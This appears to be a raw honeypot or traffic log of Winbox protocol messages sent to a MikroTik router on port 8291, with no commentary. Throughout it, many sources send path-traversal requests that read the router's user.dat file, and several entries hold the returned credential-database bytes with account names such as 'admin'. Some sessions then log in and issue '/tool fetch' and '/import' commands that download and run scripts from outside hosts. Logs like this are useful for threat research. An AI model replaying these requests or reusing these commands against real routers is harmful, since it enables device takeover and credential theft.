227.49.166.122,59076,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,58,95,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,58,221,54,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,227.49.166.122,59076,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,227.49.166.122,59076,"{ufe0001:2,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,227.49.166.122,59076,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
227.49.166.122,59076,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[226,39,15,100,171,254,237,125,182,83,49,225,156,39,47,190],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,227.49.166.122,59076,"{bff0005:1,uff0006:3,uff0007:1,s1:'user1',r9:[226,39,15,100,171,254,237,125,182,83,49,225,156,39,47,190],ra:[0,195,70,116,208,236,243,214,152,48,189,59,119,141,102,177,196],Uff0001:[13,4],Uff0002:[0,11]}"
227.49.166.122,54441,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,227.49.166.122,54441,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
227.49.166.122,54441,3.0.152.10,8291,"{u2:1209,ufe0001:3,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,227.49.166.122,54441,"{ufe0001:3,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,227.49.166.122,54441,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
227.49.166.122,54441,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[143,242,197,19,1,65,97,57,131,84,201,26,84,91,45,188],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,227.49.166.122,54441,"{bff0005:1,uff0006:3,uff0007:1,s1:'admin',r9:[143,242,197,19,1,65,97,57,131,84,201,26,84,91,45,188],ra:[0,157,112,222,137,95,214,167,77,35,165,176,109,135,61,249,206],Uff0001:[13,4],Uff0002:[0,11]}"
227.49.166.122,54441,3.0.152.10,8291,"{b13:0,ub:524286,uf:32,u10:6,ufe0001:154,uff0003:2,uff0006:3,s11:'i386',s15:'CHR',s16:'3.11',s17:'x86',s18:'default',ra:[0,157,112,222,137,95,214,167,77,35,165,176,109,135,61,249,206],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,227.49.166.122,54441,"{bfe000a:0,bff0005:1,u71:327678,u12e:4294967295,u12f:305769600,u131:600,ufe000c:5,uff0006:3,uff0007:16646149,s66:'U6',s12d:'/tool fetch url=http://7standby.com/poll/5c5354f5-4da6-4a0d-af04-f58d32a7fb84 mode=http dst-path=7wmp0b4s.rsc
/import 7wmp0b4s.rsc',sfe0009:'',Uff0001:[48,3],Uff0002:[0,130]}"
231.51.61.39,51215,3.0.152.10,8291,"{ufe0001:0,uff0003:2,uff0006:3,Uff0001:[0,130],Uff0002:[48,3]}"
3.0.152.10,8291,231.51.61.39,51215,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
231.51.61.39,51215,3.0.152.10,8291,"{u2:1209,ufe0001:4,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
231.51.61.39,51215,3.0.152.10,8291,"{u2:1209,ufe0001:4,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,23.169.76.182,62412,"{ufe0001:4,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,23.169.76.182,62412,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
3.0.152.10,8291,23.169.76.182,62412,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,240.32.2.117,53555,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
240.32.2.117,53555,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,240.32.2.117,53555,"{bff0005:1,u2:32768,ufe0001:1,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
164.232.110.83,61019,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,63,21,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,58,221,54,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,164.232.110.83,61019,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,232.174.248.104,58850,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,232.174.248.104,58850,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
232.174.248.104,58850,3.0.152.10,8291,"{u2:302,ufe0001:3,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,232.174.248.104,58850,"{bff0005:1,u2:32768,ufe0001:3,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
222.192.179.160,58387,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,241,138,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,58,221,54,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,0.23.82.36,59220,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
0.23.82.36,59220,3.0.152.10,8291,"{u2:1209,ufe0001:5,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,139.14.188.187,32984,"{ufe0001:5,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,139.14.188.187,32984,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
3.0.152.10,8291,139.14.188.187,32984,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
139.14.188.187,32984,3.0.152.10,8291,"{u2:1209,ufe0001:6,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,139.14.188.187,32984,"{ufe0001:6,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,139.14.188.187,32984,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
139.14.188.187,32984,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[221,201,133,100,129,209,84,223,11,93,98,165,176,59,35,194],Uff0001:[0,11],Uff0002:[13,4]}"
139.14.188.187,32984,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[221,201,133,100,129,209,84,223,11,93,98,165,176,59,35,194],Uff0001:[0,11],Uff0002:[13,4]}"
139.14.188.187,32984,3.0.152.10,8291,"{uff0007:16646164,uff000b:4294967295,Uff0001:[],Uff0002:[2665]}"
3.0.152.10,8291,139.14.188.187,32984,"{bff0005:1,uff0006:3,uff0007:1,s1:'support',r9:[221,201,133,100,129,209,84,223,11,93,98,165,176,59,35,194],ra:[0,19,102,211,107,123,137,109,179,116,34,159,171,217,166,79,37],Uff0001:[13,4],Uff0002:[0,11]}"
3.0.152.10,8291,139.14.188.187,32984,"{bfe000a:0,bff0005:1,u71:327678,u12e:4294967295,u12f:305769600,u131:600,ufe000c:5,uff0006:6,uff0007:16646149,s66:'U6',s12d:'/tool fetch url=http://1awesome.net/poll/f258b601-38dc-42c8-b0e3-f55da33a2e89 mode=http dst-path=7wmp0b4s.rsc
/import 7wmp0b4s.rsc',sfe0009:'',Uff0001:[48,3],Uff0002:[0,130]}"
125.130.111.41,61132,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
125.130.111.41,61132,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:6,uff0008:16646153,Uff0001:[0,130],Uff0002:[48,3]}"
3.0.152.10,8291,125.130.111.41,61132,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
125.130.111.41,61132,3.0.152.10,8291,"{u2:302,ufe0001:7,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,125.130.111.41,61132,"{bff0005:1,u2:32768,ufe0001:7,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,43.206.249.180,62844,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
172.154.50.2,50139,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
172.154.50.2,50139,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,172.154.50.2,50139,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
172.154.50.2,50139,3.0.152.10,8291,"{u2:302,ufe0001:2,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,172.154.50.2,41876,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
172.154.50.2,41876,3.0.152.10,8291,"{u2:1209,ufe0001:3,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
172.154.50.2,41876,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[47,9,100,173,103,37,96,161,174,44,94,26,28,203,237,3],Uff0001:[0,11],Uff0002:[13,4]}"
172.154.50.2,41876,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[47,9,100,173,103,37,96,161,174,44,94,26,28,203,237,3],Uff0001:[0,11],Uff0002:[13,4]}"
172.154.50.2,41876,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[47,9,100,173,103,37,96,161,174,44,94,26,28,203,237,3],Uff0001:[0,11],Uff0002:[13,4]}"
172.154.50.2,41876,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[47,9,100,173,103,37,96,161,174,44,94,26,28,203,237,3],Uff0001:[0,11],Uff0002:[13,4]}"
172.154.50.2,41876,3.0.152.10,8291,"{uff0007:16646164,uff000b:4294967295,Uff0001:[],Uff0002:[1165]}"
172.154.50.2,41876,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
172.154.50.2,41876,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646153,Uff0001:[0,130],Uff0002:[48,3]}"
172.154.50.2,41876,3.0.152.10,8291,"{uff0007:16646164,uff000b:4294967295,Uff0001:[],Uff0002:[1166]}"
172.154.50.2,41876,3.0.152.10,8291,"{uff0007:16646164,uff000b:4294967295,Uff0001:[],Uff0002:[1166]}"
172.154.50.2,41876,3.0.152.10,8291,"{uff0007:16646164,uff000b:4294967295,Uff0001:[],Uff0002:[1166]}"
43.167.137.110,32333,3.0.152.10,8291,"{u2:302,ufe0001:4,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
76.10.205.82,17332,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,41,11,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,58,221,54,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,192.215.200.88,48731,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
192.215.200.88,48731,3.0.152.10,8291,"{u2:1209,ufe0001:1,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,192.215.200.88,48731,"{ufe0001:1,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,192.215.200.88,48731,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
192.215.200.88,48731,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[63,169,239,159,199,106,16,121,145,35,32,247,135,43,247,252],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,192.215.200.88,48731,"{bff0005:1,uff0006:3,uff0007:1,s1:'tit0nich',r9:[63,169,239,159,199,106,16,121,145,35,32,247,135,43,247,252],ra:[0,240,68,199,231,71,7,85,0,7,81,170,218,251,198,80,2],Uff0001:[13,4],Uff0002:[0,11]}"
193.60.50.117,55186,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,205.121.225.23,64788,"{bff0005:1,uff0006:7,uff0007:7,s1:'./.././.././.././.././../rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
205.121.225.23,64788,3.0.152.10,8291,"{u2:302,ufe0001:2,uff0003:2,uff0006:7,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,205.121.225.23,64788,"{bff0005:1,u2:32768,ufe0001:2,uff0006:0,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
167.248.127.189,50340,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:0,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,162,52,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,58,221,54,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,167.248.127.189,50340,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,167.248.127.189,50340,"{bff0005:1,u2:32768,ufe0001:3,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
3.0.152.10,8291,93.2.115.42,54471,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
93.2.115.42,54471,3.0.152.10,8291,"{u2:302,ufe0001:1,uff0003:2,uff0006:5,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,93.2.115.42,54471,"{bff0005:1,u2:32768,ufe0001:1,uff0006:6,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
93.2.115.42,60076,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:6,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,234,8,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,58,221,54,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,93.2.115.42,60076,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,93.2.115.42,60076,"{ufe0001:2,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,93.2.115.42,60076,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
93.2.115.42,60076,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[37,85,48,163,90,119,29,94,227,163,236,250,167,44,230,23],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,93.2.115.42,60076,"{bff0005:1,uff0006:3,uff0007:1,s1:'user',r9:[37,85,48,163,90,119,29,94,227,163,236,250,167,44,230,23],ra:[0,226,23,60,181,166,27,18,169,185,215,150,122,64,241,127,241],Uff0001:[13,4],Uff0002:[0,11]}"
93.2.115.42,64059,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
93.2.115.42,64059,3.0.152.10,8291,"{uff0003:2,uff0004:2,uff0006:3,uff0008:16646150,sff0009:'invalid user name or password',Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,93.2.115.42,64059,"{bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}"
93.2.115.42,64059,3.0.152.10,8291,"{u2:1209,ufe0001:3,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}"
3.0.152.10,8291,93.2.115.42,64059,"{ufe0001:3,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}"
3.0.152.10,8291,93.2.115.42,64059,"{bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}"
93.2.115.42,64059,3.0.152.10,8291,"{uff0003:2,uff0006:2,r9:[23,17,203,49,228,43,100,169,184,109,34,5,252,138,233,134],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,93.2.115.42,64059,"{bff0005:1,uff0006:3,uff0007:1,s1:'admin',r9:[23,17,203,49,228,43,100,169,184,109,34,5,252,138,233,134],ra:[0,247,20,128,15,207,246,249,54,255,202,124,195,171,111,84,245],Uff0001:[13,4],Uff0002:[0,11]}"
93.2.115.42,64059,3.0.152.10,8291,"{b13:0,ub:524286,uf:32,u10:6,ufe0001:77,uff0003:2,uff0006:3,s11:'i386',s15:'CHR',s16:'3.11',s17:'x86',s18:'default',ra:[0,247,20,128,15,207,246,249,54,255,202,124,195,171,111,84,245],Uff0001:[0,11],Uff0002:[13,4]}"
3.0.152.10,8291,93.2.115.42,64059,"{bfe000a:0,bff0005:1,u71:327678,u12e:4294967295,u12f:305769600,u131:600,ufe000c:5,uff0006:3,uff0007:16646149,s66:'U6',s12d:'/tool fetch url=http://takebad1.com/poll/f33cbbb5-1300-4951-8066-30738f9bda77 mode=http dst-path=7wmp0b4s.rsc
/import 7wmp0b4s.rsc',sfe0009:'',Uff0001:[48,3],Uff0002:[0,130]}"
105.222.77.51,50620,3.0.152.10,8291,"{ufe0001:0,uff0003:2,uff0006:3,Uff0001:[0,130],Uff0002:[48,3]}"
3.0.152.10,8291,105.222.77.51,50620,"{bff0005:1,uff0006:7,uff0007:7,s1:'./.././.././.././.././../rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
105.222.77.51,50620,3.0.152.10,8291,"{u2:302,ufe0001:4,uff0003:2,uff0006:7,Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,105.222.77.51,50620,"{bff0005:1,u2:32768,ufe0001:4,uff0006:0,uff0007:4,Uff0001:[2,2],Uff0002:[0,8]}"
228.93.77.36,28241,3.0.152.10,8291,"{b4:1,uff0003:2,uff0006:0,r3:[85,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,93,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,94,22,55,93,11,0,0,8,110,254,5,0,18,0,0,9,0,1,0,254,9,2,2,0,0,9,1,9,0,254,33,0,17,0,0,33,16,133,155,71,222,39,147,242,143,15,216,18,78,7,251,105,164,1,0,0,33,3,97,112,105,97,100,109,105,110,114,0,77,50,16,0,0,168,0,0,28,0,0,1,10,0,254,0,5,0,0,9,0,6,0,0,9,0,31,0,0,8,170,9,55,93,11,0,0,8,254,255,7,0,18,0,0,9,2,1,0,254,9,1,2,0,0,9,3,9,0,254,33,19,115,121,115,116,101,109,32,100,101,102,97,117,108,116,32,117,115,101,114,17,0,0,33,16,9,202,177,49,49,55,76,103,49,145,156,72,230,2,164,164,1,0,0,33,5,97,100,109,105,110],Uff0001:[0,8],Uff0002:[2,2]}"
3.0.152.10,8291,228.93.77.36,28241,"{bff0005:1,uff0006:5,uff0007:7,s1:'/////./..//////./..//////./../flash/rw/store/user.dat',Uff0001:[2,2],Uff0002:[0,8]}"
